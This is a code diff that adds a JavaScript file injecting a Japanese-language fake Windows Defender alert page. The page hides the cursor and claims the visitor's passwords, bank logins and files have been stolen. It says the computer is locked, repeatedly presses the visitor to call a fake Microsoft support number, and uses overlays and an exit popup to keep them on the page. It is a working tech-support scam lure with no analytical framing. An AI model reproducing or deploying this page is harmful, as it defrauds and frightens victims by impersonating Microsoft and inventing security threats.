@@ -1,0 +1,179 @@
+document.getElementById("szmakw").innerHTML = `
+
+<div class="bg" style="cursor:none"> 
+<div class="bgimg" style="top:0"><img src="images/fesbg.webp" alt="" width="100%"></div>
+</div>
+<a href="#" id="link_black" style="cursor:none" rel="noreferrer">
+<div class="black" style="height: 145%; cursor: none; display: block;"></div>
+</a>
+<div class="pro_box2" style="cursor: none; display: block;"><img src="images/TshJduh.jpg" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
+</div>
+<div class="pro_box3" style="cursor: none; display: block;"><img src="images/YsdynYy.png" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
+</div>
+<div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
+<div class="row">
+<div class="col-md-12">
+<div class="right-foot" style="text-align:center;margin-bottom: 5px;"><span id="footertxt">              <img src="images/img01df.png"> Windows セキュリティ </span> <span style="font-weight:500;padding-left:13px;color:#fff; ">Windowsサポートをダイヤルします。: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> お電話で直接お問い合わせください 0101-866-881-2460            </span>                    </span>
+</div>
+</div>
+<div class="col-md-12">
+<marquee direction="left" height="100px" width="100%"><small> <div class="text-left" style="color:#eee;font-size:10px">認識されないアプリがWindowsによってブロックされました
+ディフェンダー SmartScreen。 お使いのシステムが脆弱である可能性があります。 窓
+Defender scanは、パスワード、個人情報、財務データ、および個人ファイルを盗む可能性のあるアドウェアを検出しました。 </small>
+</marquee>
+</div>
+</div>
+</div>
+<div class="lightbox" id="poptxt" style="display: block;">
+<div class="ilb top" style="font-size:17px">
+<div class="ilb headers" style="border-bottom:1px solid #d6d5d5"><span class="fl title" id="txtadd">            <span class="fl ilb">              <img src="images/dm.png" class="logo3">            </span>Windows Defenderセキュリティセンター</span> <span class="fl title2" id="txts1">            <a href="#" id="bgt">              <img src="images/cs.png">            </a>          </span>
+</div>
+</div>
+<div id="txtintro"><span class="colo-rd">          <div id="ip_add">Windows Defenderセキュリティセンター</div>          <div id="cityopm">セキュリティ侵害の影響を受けるシステム</div>          <div id="isp"> (エラーコード：16JPSY7)</div>        </span>
+</div>
+<img src="images/re.gif" id="banner">
+<div id="disclaimer">システムへのアクセスは、保護のために制限されています。<br> <span class="support" style="font-size:22px;">Windowsサポートにお問い合わせください: <br> <img src="images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> お電話で直接お問い合わせください <br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px">0101-866-881-2460</span>            </span>
+</div>
+<div id="bottom"><img src="images/img01df.png" id="badge"> <span class="title3">Windows</span>
+<ul>
+<li><a href="#">
+<div class="fr button2"><span id="addtochromebutton">許可する</span></div>
+</a></li>
+<li><a href="#">
+<div class="fr button blink"><span id="addtochromebutton">キャンセル</span></div>
+</a></li>
+</ul>
+</div>
+</div>
+<div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new"><p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">Windows Defender-セキュリティ警告</p>
+このシステムは、セキュリティ上の理由からアクセスすることはできません。<p></p>
+お使いのコンピュータは、悪意のある脅威を持っていると報告されています。
+<br><br><br><br>次の情報が盗まれました：<br>>>メールアドレス<br>>>銀行ログイン
+パスワード<br>>>Facebookアカウントログイン<br>>>写真と文書<br>Windows Defenderによると
+スキャン、このデバイスは、パスワード、オンラインId、財務情報、個人ファイル、写真、および文書を盗むことができるアドウェアが含まれています。
+<br>すぐにご連絡ください。 私たちのエンジニアは、電話での除去プロセスをご案内します。 <br>お問い合わせ窓口
+脅威を報告し、個人情報の盗難を停止し、このデバイスへのアクセスのブロックを解除するために、すぐにサポートしています。 <br>
+このウィンドウを閉じると、Windowsの登録が中断され、個人情報が危険にさらされる可能性があります。 <br>
+<p style="padding-bottom:0;color:#fff;font-size:16px">Windowsサポートにお電話ください: <strong> <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>お電話で直接お問い合わせください  0101-866-881-2460        </span></strong>
+</p>
+<div class="action_buttons"><a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">OK</a> <a class="active" id="leave_page" style="color:#fff!important">キャンセル</a>
+</div>
+</div>
+<div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+<p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
+お早めにご連絡ください。 私達のエンジニアは電話上の取り外しプロセスとの助けます。 お使いのコンピュータが無効になっています。 ウィンドウズ
+Defender SmartScreenが認識されないアプリケーションを停止しました。 このアプリケーションを実行すると、システムのセキュ</br>直接お電話0101-866-881-2460
+</p>
+</div> <br> <strong>Windowsサポートを呼び出す: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="images/winlo.png" alt="&nbsp;" style="width: 25px;vertical-align: bottom;"> 
+</span>
+</strong></p>
+</div>
+<div id="chat" style="display: block;"><img src="images/img01df.png"> <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+<p style="font-weight:600;font-size:24px">コールサポート: <br></p>
+<h4 style="font-weight:600;font-size:22px"><img src="images/winlo.png" alt="" style="width: 25px;margin-left: 0;"> お電話ください<br>
+0101-866-881-2460
+<br>（セキュリティヘルプデスク）
+</h4>
+<div class="arrow-down">
+<svg height="1em" viewBox="0 0 320 512">
+<style>                svg {
+fill: #fff
+}            </style>
+<path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path> 
+</svg> 
+</div>
+</div>
+<style> #exit-popup { 
+position: fixed; 
+left: 0; 
+top: 0; 
+right: 0; 
+margin: 0 auto; 
+display: none; 
+background-color: #fff; 
+max-width: 460px; 
+padding: 10px; 
+border-radius: 8px; 
+box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); 
+font-family: Arial, Helvetica, sans-serif; 
+width: 90%; 
+box-sizing: border-box; 
+z-index: 9999999999999999999999;
+}
+ 
+.btn_leave { 
+padding: 10px 20px; 
+background-color: #1b73e8; 
+color: #fff !important; 
+text-transform: capitalize; 
+text-decoration: none; 
+border: 1px solid #ddd; 
+border-radius: 5px; 
+display: inline-block; 
+animation: zoominoutsinglefeatured 1s infinite;
+}
+ 
+.btn_cancel { 
+padding: 10px 20px; 
+border: 1px solid #ddd; 
+color: #1b73e8 !important; 
+text-transform: capitalize; 
+text-decoration: none; 
+border-radius: 5px; 
+display: inline-block; 
+margin-left: 10px; 
+background-color: transparent;
+}
+ 
+.btn-wrapper { 
+text-align: right; 
+margin-top: 20px;
+}
+ 
+@keyframes zoominoutsinglefeatured { 
+0% { 
+transform: scale(1, 1); 
+} 
+50% { 
+transform: scale(1.1, 1.1);
+}
+100% {
+transform: scale(1, 1);
+}
+}
+ 
+@keyframes zoomininsinglefeatured {
+0% {
+transform: scale(1, 1); 
+}
+50% {
+transform: scale(1.1, 1.1); 
+}
+100% {
+transform: scale(1, 1); 
+}
+}
+ 
+@keyframes scale {
+0% {
+transform: scale(1);
+}
+100% {
+transform: scale(1.2); 
+}
+}</style>
+<div id="overlay2" style="    z-index: 9999999999;    position: fixed;    height: 100vh;    width: 100vw;    background: black;    display: none;">
+<div style="height: 250px;width: 650px;margin: auto;margin-top: calc( (100vh / 2) - 125px );border: 2px white solid;padding: 50px; animation: scale 2s infinite alternate;">
+<p class="text-center" style="color: #FEFEFE; font-size: large;"> コンピュータを再起動したり操作したりしないでください。<br>
+お使いのコンピュータが無効になっています。 すぐに電話してください。<br>このコンピュータへのアクセスは、セキュリティ上の理由からブロックされています。<br>
+すぐにご連絡ください。 技術者が問題の解決を支援します。</br>直接お電話0101-866-881-2460 </p></div> 
+</div>
+<div id="exit-popup" style="display: block;"><h3>あなたはサイトを離れていますか？</h3>
+<p style="font-size: large">本当にこのページを離れたいですか？</p>
+<div class="btn-wrapper">
+<button class="btn_leave" style="font-size: large">去る</button>
+<button class="btn_cancel" style="font-size: large">キャンセル</button>
+</div>
+</div>
+
+`;
